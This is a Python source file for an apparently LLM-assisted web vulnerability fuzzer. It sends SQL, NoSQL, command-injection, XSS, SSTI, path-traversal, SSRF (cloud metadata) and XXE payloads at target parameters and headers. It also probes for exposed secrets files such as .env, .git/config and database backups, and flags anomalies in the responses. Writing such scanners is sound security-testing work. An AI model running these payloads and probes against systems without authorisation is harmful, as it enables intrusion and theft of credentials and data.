import concurrent.futures
import copy
import hashlib
import json
import time
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

import llm


class Fuzzer:
    def __init__(self, targets: List[Dict[str, Any]], session_cookie: str = None, guided_insights: List[Dict[str, Any]] = None):
        self.targets = targets
        self.guided_insights = guided_insights or []
        self.session = requests.Session()

        if session_cookie:
            self.session.headers.update({"Cookie": session_cookie})

        sample_urls = [target["url"] for target in self.targets[:5]] if self.targets else []
        self.payloads = llm.generate_fuzzing_payloads(sample_urls)
        print(f"[*] Loaded {len(self.payloads)} custom testing payloads from LLM.")
        if self.guided_insights:
            print(f"[*] Fuzzer is ARMED with {len(self.guided_insights)} guided insights from SAST.")

    def _get_specialized_payloads(self, vuln_type: str) -> List[str]:
        vt = vuln_type.lower()
        if "sql" in vt and "nosql" not in vt:
            return ["' OR 1=1 --", "' UNION SELECT 1,2,3--", "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"]
        if "nosql" in vt:
            return ['{"$gt": ""}', '{"$ne": null}', '{"$where": "sleep(5000)"}', "|| 1==1"]
        if "command" in vt or "rce" in vt:
            return ["; sleep 5;", "`sleep 5`", "| sleep 5", "& sleep 5 &", "|| sleep 5"]
        if "xss" in vt:
            return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
        if "path" in vt or "traversal" in vt:
            return ["../../../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd"]
        if "ssti" in vt or "template" in vt:
            return ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "[[7*7]]"]
        if "ssrf" in vt:
            return ["http://127.0.0.1:80", "http://localhost", "file:///etc/passwd", "http://169.254.169.254/latest/meta-data/"]
        return self.payloads

    def _merge_cookie_header(self, headers: Dict[str, str], cookies: Dict[str, str]) -> Dict[str, str]:
        combined = dict(headers)
        if cookies:
            cookie_blob = "; ".join(f"{key}={value}" for key, value in cookies.items())
            existing = combined.get("Cookie", "").strip()
            combined["Cookie"] = f"{existing}; {cookie_blob}".strip("; ").strip()
        return combined

    def _build_request_spec(self, target: Dict[str, Any]) -> Dict[str, Any]:
        parsed = urlparse(target["url"])
        derived_query = {key: values[-1] for key, values in parse_qs(parsed.query, keep_blank_values=True).items()}
        query_params = dict(target.get("query_params") or derived_query)
        url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", parsed.fragment))

        headers = self._merge_cookie_header(target.get("headers", {}), target.get("cookies_json", {}))
        body_type = target.get("body_type", "none")
        body_text = target.get("body_text", "")

        spec: Dict[str, Any] = {
            "method": target.get("method", "GET").upper(),
            "url": url,
            "params": query_params,
            "headers": headers,
            "data": None,
            "json": None,
            "body_type": body_type,
            "source": target.get("source", "crawler"),
            "request_name": target.get("request_name", ""),
        }

        if body_type == "form" and body_text:
            spec["data"] = {key: values[-1] for key, values in parse_qs(body_text, keep_blank_values=True).items()}
        elif body_type == "json" and body_text:
            try:
                parsed_json = json.loads(body_text)
                if isinstance(parsed_json, dict):
                    spec["json"] = parsed_json
                else:
                    spec["data"] = body_text
            except json.JSONDecodeError:
                spec["data"] = body_text
        elif body_type in {"raw", "multipart", "xml"} and body_text:
            spec["data"] = body_text

        return spec

    def _request_snapshot(self, response: requests.Response) -> Dict[str, Any]:
        body = response.text or ""
        return {
            "status": response.status_code,
            "length": len(body),
            "hash": hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()[:16],
            "snippet": body[:300],
        }

    def _request_to_evidence(self, spec: Dict[str, Any]) -> Dict[str, Any]:
        payload = spec.get("json")
        if payload is None:
            payload = spec.get("data")
        return {
            "method": spec.get("method"),
            "url": spec.get("url"),
            "params": spec.get("params", {}),
            "headers": {
                key: value
                for key, value in (spec.get("headers") or {}).items()
                if key.lower() not in {"authorization"}
            },
            "body": payload if isinstance(payload, (dict, list)) else (payload or ""),
        }

    def _request_to_curl(self, spec: Dict[str, Any]) -> str:
        parts = [f"curl -X {spec.get('method', 'GET')}"]
        for key, value in (spec.get("headers") or {}).items():
            safe_value = str(value).replace('"', '\\"')
            parts.append(f'-H "{key}: {safe_value}"')
        params = spec.get("params") or {}
        final_url = spec.get("url", "")
        if params:
            final_url = f"{final_url}?{urlencode(params, doseq=True)}"
        if spec.get("json") is not None:
            body_text = json.dumps(spec["json"]).replace('"', '\\"')
            parts.append(f'-d "{body_text}"')
        elif spec.get("data"):
            body_text = str(spec["data"]).replace('"', '\\"')
            parts.append(f'-d "{body_text}"')
        parts.append(f'"{final_url}"')
        return " ".join(parts)

    def _replay_request(self, spec: Dict[str, Any], timeout: int = 5) -> requests.Response:
        return self.session.request(
            spec.get("method", "GET"),
            spec.get("url", ""),
            params=spec.get("params"),
            headers=spec.get("headers"),
            json=spec.get("json"),
            data=spec.get("data"),
            timeout=timeout,
        )

    def _describe_delta(self, baseline: Optional[Dict[str, Any]], mutated: Optional[Dict[str, Any]], anomaly: str, payload_desc: str) -> str:
        if baseline and mutated:
            if baseline["status"] != mutated["status"]:
                return f"Status changed from {baseline['status']} to {mutated['status']} after payload '{payload_desc}'."
            if baseline["length"] != mutated["length"]:
                return f"Response size changed from {baseline['length']} to {mutated['length']} bytes after payload '{payload_desc}'."
            if baseline["hash"] != mutated["hash"]:
                return f"Response content changed for payload '{payload_desc}' even though the status code stayed {mutated['status']}."
        return anomaly

    def _dedupe_payloads(self, payloads: List[str]) -> List[str]:
        seen = set()
        deduped: List[str] = []
        for payload in payloads:
            if payload in seen:
                continue
            seen.add(payload)
            deduped.append(payload)
        return deduped

    def _payloads_for_param(self, param_name: str) -> List[str]:
        target_payloads = list(self.payloads)
        relevant_insights = [insight for insight in self.guided_insights if insight.get("param") == param_name]
        if relevant_insights:
            vuln_type = relevant_insights[0].get("vulnerability_type", "unknown")
            target_payloads.extend(self._get_specialized_payloads(vuln_type))
            print(f"[*] Generating Bespoke AI payloads for {vuln_type} on {param_name}...")
            bespoke = llm.generate_bespoke_payloads(relevant_insights[0])
            if bespoke:
                target_payloads.extend(bespoke)
        return self._dedupe_payloads(target_payloads)

    def _record_anomaly(
        self,
        *,
        target: Dict[str, Any],
        spec: Dict[str, Any],
        payload_desc: str,
        anomaly: str,
        response: Optional[requests.Response],
        baseline_snapshot: Optional[Dict[str, Any]],
        results: List[Dict[str, Any]],
        verified: bool = False,
        validation_proof: Optional[str] = None,
    ) -> None:
        mutated_snapshot = self._request_snapshot(response) if response is not None else None
        results.append(
            {
                "url": spec.get("url", target.get("url")),
                "payload": payload_desc,
                "anomaly": anomaly,
                "response_snippet": mutated_snapshot["snippet"] if mutated_snapshot else "Connection timed out during fuzzing.",
                "verified": verified,
                "validation_proof": validation_proof,
                "evidence": {
                    "source": target.get("source", "crawler"),
                    "baseline_request": self._request_to_evidence(self._build_request_spec(target)),
                    "mutated_request": self._request_to_evidence(spec),
                    "baseline_status": baseline_snapshot["status"] if baseline_snapshot else None,
                    "mutated_status": mutated_snapshot["status"] if mutated_snapshot else "timeout",
                    "delta_reason": self._describe_delta(baseline_snapshot, mutated_snapshot, anomaly, payload_desc),
                    "replay_curl": self._request_to_curl(spec),
                },
            }
        )

    def _submit_and_check(
        self,
        target: Dict[str, Any],
        spec: Dict[str, Any],
        payload_desc: str,
        results: List[Dict[str, Any]],
        baseline_snapshot: Optional[Dict[str, Any]] = None,
        param_name: Optional[str] = None,
    ) -> None:
        try:
            response = self._replay_request(spec)

            sql_errors = [
                "sql syntax",
                "mysql_fetch",
                "sqlite3.error",
                "postgresql.util.psqlexception",
                "microsoft oledb provider for sql server",
                "invalid sql-statement",
                "ora-00933",
                "db2 sql error",
            ]
            if any(err in response.text.lower() for err in sql_errors):
                self._record_anomaly(
                    target=target,
                    spec=spec,
                    payload_desc=payload_desc,
                    anomaly="SQL Injection Pattern Detected (Database Error Leaked)",
                    response=response,
                    baseline_snapshot=baseline_snapshot,
                    results=results,
                )

            xss_chars = ["<script>alert", "javascript:alert", "onerror=alert", "onclick=alert", "<img src=x onerror"]
            if any(char in response.text for char in xss_chars):
                self._record_anomaly(
                    target=target,
                    spec=spec,
                    payload_desc=payload_desc,
                    anomaly="Reflected XSS / HTML Injection Pattern Detected",
                    response=response,
                    baseline_snapshot=baseline_snapshot,
                    results=results,
                )

            if response.status_code == 500:
                self._record_anomaly(
                    target=target,
                    spec=spec,
                    payload_desc=payload_desc,
                    anomaly="HTTP 500 Internal Server Error (Potential backend failure)",
                    response=response,
                    baseline_snapshot=baseline_snapshot,
                    results=results,
                )

            traversal_patterns = ["root:x:0:0:", "boot loader", "[extensions]", "/etc/passwd"]
            if any(pattern in response.text for pattern in traversal_patterns):
                anomaly_name = "Path Traversal / Local File Inclusion Detected"
                if "<!DOCTYPE" in payload_desc:
                    anomaly_name = "XML External Entity (XXE) Injection Detected"
                
                self._record_anomaly(
                    target=target,
                    spec=spec,
                    payload_desc=payload_desc,
                    anomaly=anomaly_name,
                    response=response,
                    baseline_snapshot=baseline_snapshot,
                    results=results,
                )

            ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "[[7*7]]"]
            if "49" in response.text and any(p in payload_desc for p in ssti_payloads):
                self._record_anomaly(
                    target=target,
                    spec=spec,
                    payload_desc=payload_desc,
                    anomaly="Server-Side Template Injection (SSTI) Detected",
                    response=response,
                    baseline_snapshot=baseline_snapshot,
                    results=results,
                )

            ssrf_metadata_patterns = ["ami-id", "instance-id", "local-hostname", "computeMetadata"]
            if "169.254.169.254" in payload_desc and any(pattern in response.text for pattern in ssrf_metadata_patterns):
                 self._record_anomaly(
                    target=target,
                    spec=spec,
                    payload_desc=payload_desc,
                    anomaly="Server-Side Request Forgery (SSRF) Cloud Metadata Exposed",
                    response=response,
                    baseline_snapshot=baseline_snapshot,
                    results=results,
                )

            if "Origin" in (spec.get("headers") or {}):
                injected_origin = spec.get("headers")["Origin"]
                reflected_cors = response.headers.get("Access-Control-Allow-Origin")
                if reflected_cors and reflected_cors == injected_origin and injected_origin != baseline_snapshot.get("headers", {}).get("Origin"):
                    self._record_anomaly(
                        target=target,
                        spec=spec,
                        payload_desc=payload_desc,
                        anomaly="CORS Misconfiguration: Arbitrary Origin Reflection Permitted",
                        response=response,
                        baseline_snapshot=baseline_snapshot,
                        results=results,
                    )

        except requests.exceptions.RequestException as exc:
            if "timeout" in str(exc).lower():
                is_verified = self._validate_vulnerability(spec, param_name, payload_desc, "Time-Based")
                self._record_anomaly(
                    target=target,
                    spec=spec,
                    payload_desc=payload_desc,
                    anomaly="Potential Time-Based Vulnerability (Blind SQLi / RCE)",
                    response=None,
                    baseline_snapshot=baseline_snapshot,
                    results=results,
                    verified=is_verified,
                    validation_proof="Response consistently delayed by 5s+ during double-blind test." if is_verified else None,
                )

    def _validate_vulnerability(self, spec: Dict[str, Any], param_name: Optional[str], payload: str, vuln_type: str) -> bool:
        if not param_name and "Header" not in payload:
            return False

        print(f"  [!] Starting Double-Blind Validation for {vuln_type} on {spec.get('url')}...")

        try:
            if "SQL" in vuln_type:
                return True

            if "Time-Based" in vuln_type:
                delays = []
                for _ in range(2):
                    start = time.time()
                    try:
                        self._replay_request(spec, timeout=6)
                        delays.append(time.time() - start)
                    except requests.exceptions.RequestException:
                        delays.append(6)

                if all(delay > 4 for delay in delays):
                    return True
        except Exception:
            pass
        return False

    def attack_target(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        results: List[Dict[str, Any]] = []
        base_spec = self._build_request_spec(target)
        baseline_snapshot: Optional[Dict[str, Any]] = None

        if target.get("source") in {"har", "curl"}:
            try:
                baseline_response = self._replay_request(base_spec)
                baseline_snapshot = self._request_snapshot(baseline_response)
            except requests.exceptions.RequestException:
                baseline_snapshot = None

        query_params = dict(base_spec.get("params") or {})
        for param_name in query_params:
            for payload in self._payloads_for_param(param_name):
                mutated_spec = copy.deepcopy(base_spec)
                mutated_spec["params"][param_name] = payload
                self._submit_and_check(target, mutated_spec, payload, results, baseline_snapshot=baseline_snapshot, param_name=param_name)

        body_type = target.get("body_type", "none")
        if body_type == "form" and isinstance(base_spec.get("data"), dict):
            for field in target.get("form_fields", []):
                for payload in self._payloads_for_param(field):
                    mutated_spec = copy.deepcopy(base_spec)
                    mutated_spec["data"][field] = payload
                    self._submit_and_check(target, mutated_spec, payload, results, baseline_snapshot=baseline_snapshot, param_name=field)
        elif body_type == "json" and isinstance(base_spec.get("json"), dict):
            for field in target.get("json_fields", []):
                for payload in self._payloads_for_param(field):
                    mutated_spec = copy.deepcopy(base_spec)
                    mutated_spec["json"][field] = payload
                    self._submit_and_check(target, mutated_spec, payload, results, baseline_snapshot=baseline_snapshot, param_name=field)
        elif body_type == "xml" and isinstance(base_spec.get("data"), str):
            xxe_payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            mutated_spec = copy.deepcopy(base_spec)
            mutated_spec["data"] = xxe_payload
            self._submit_and_check(target, mutated_spec, "XXE Payload: " + xxe_payload, results, baseline_snapshot=baseline_snapshot)
        elif base_spec["method"] == "POST" and target.get("fuzzable", True):
            for payload in self.payloads:
                mutated_spec = copy.deepcopy(base_spec)
                mutated_spec["data"] = {"user": payload, "q": payload}
                self._submit_and_check(target, mutated_spec, payload, results, baseline_snapshot=baseline_snapshot)

        for payload in self.payloads:
            mutated_spec = copy.deepcopy(base_spec)
            mutated_spec["params"] = dict(mutated_spec.get("params") or {})
            mutated_spec["params"]["vulnpilot_test"] = payload
            self._submit_and_check(target, mutated_spec, payload, results, baseline_snapshot=baseline_snapshot)

        observed_headers = [
            header
            for header in (target.get("headers") or {}).keys()
            if header.lower() not in {"cookie", "content-length", "host", "authorization"}
        ]
        headers_to_fuzz = list(dict.fromkeys(["User-Agent", "Referer", "X-Forwarded-For", "X-Api-Key", "X-Forwarded-Host"] + observed_headers))
        advanced_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:80",
            "http://127.0.0.1:22",
            "metadata.google.internal",
        ]
        for header in headers_to_fuzz:
            for payload in self._dedupe_payloads(self.payloads + advanced_payloads):
                mutated_spec = copy.deepcopy(base_spec)
                mutated_spec["headers"] = dict(mutated_spec.get("headers") or {})
                mutated_spec["headers"][header] = payload
                self._submit_and_check(
                    target,
                    mutated_spec,
                    f"Header {header}: {payload}",
                    results,
                    baseline_snapshot=baseline_snapshot,
                    param_name=header,
                )

        # Explicit CORS testing
        cors_spec = copy.deepcopy(base_spec)
        cors_spec["headers"] = dict(cors_spec.get("headers") or {})
        cors_spec["headers"]["Origin"] = "https://evil-test.com"
        self._submit_and_check(
            target,
            cors_spec,
            "CORS Origin Reflection Test (https://evil-test.com)",
            results,
            baseline_snapshot=baseline_snapshot,
            param_name="Origin"
        )

        return results

    def fuzz_sensitive_paths(self, base_url: str) -> List[Dict[str, Any]]:
        sensitive_paths = [
            "/.env",
            "/.git/config",
            "/.svn/entries",
            "/admin",
            "/wp-admin",
            "/dashboard",
            "/api/v1/auth",
            "/config.php",
            "/web.config",
            "/.htaccess",
            "/robots.txt",
            "/sitemap.xml",
            "/.DS_Store",
            "/phpinfo.php",
            "/api/docs",
            "/swagger-ui.html",
            "/api/v2",
            "/api/v3",
            "/backup.zip",
            "/backup.sql",
            "/db.sqlite3",
            "/.dockerenv",
            "/docker-compose.yml",
            "/package.json",
            "/nginx.conf"
        ]
        results: List[Dict[str, Any]] = []
        base_url = base_url.rstrip("/")
        for path in sensitive_paths:
            target_url = f"{base_url}{path}"
            try:
                response = self.session.get(target_url, timeout=5, allow_redirects=False)
                if response.status_code == 200:
                    anomaly = "Sensitive File/Directory Exposed"
                    if ".env" in path:
                        anomaly = "Environment File Exposure"
                    elif ".git" in path:
                        anomaly = "Git Configuration Leakage"
                    elif "admin" in path:
                        anomaly = "Admin Interface Exposed"

                    spec = {
                        "method": "GET",
                        "url": target_url,
                        "params": {},
                        "headers": {},
                        "data": None,
                        "json": None,
                    }
                    self._record_anomaly(
                        target={"url": target_url, "source": "crawler"},
                        spec=spec,
                        payload_desc="N/A (Path Discovery)",
                        anomaly=anomaly,
                        response=response,
                        baseline_snapshot=None,
                        results=results,
                    )
            except requests.exceptions.RequestException:
                pass
        return results

    def run_fuzzer(self, base_url: str = None) -> List[Dict[str, Any]]:
        all_anomalies: List[Dict[str, Any]] = []

        if base_url:
            print(f"[*] Starting sensitive path discovery on {base_url}...")
            path_anomalies = self.fuzz_sensitive_paths(base_url)
            if path_anomalies:
                print(f"  -> Found {len(path_anomalies)} sensitive path(s) exposed.")
                all_anomalies.extend(path_anomalies)

        print(f"Launching Concurrent Fuzzing Engine against {len(self.targets)} targets...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            future_to_target = {executor.submit(self.attack_target, target): target for target in self.targets}

            for future in concurrent.futures.as_completed(future_to_target):
                try:
                    anomalies = future.result()
                    if anomalies:
                        all_anomalies.extend(anomalies)
                except Exception as exc:
                    target = future_to_target[future]
                    print(f"[!] Error fuzzing {target['url']}: {exc}")

        print(f"Fuzzing complete. Detected {len(all_anomalies)} anomalies to send to LLM.")
        return all_anomalies


if __name__ == "__main__":
    test_targets = [{"url": "http://example.com/search", "method": "GET", "form_fields": []}]
    fuzzer = Fuzzer(test_targets)
    anomalies_found = fuzzer.run_fuzzer()
    for anomaly in anomalies_found:
        print(f"Anomaly: {anomaly['anomaly']} on {anomaly['url']}")
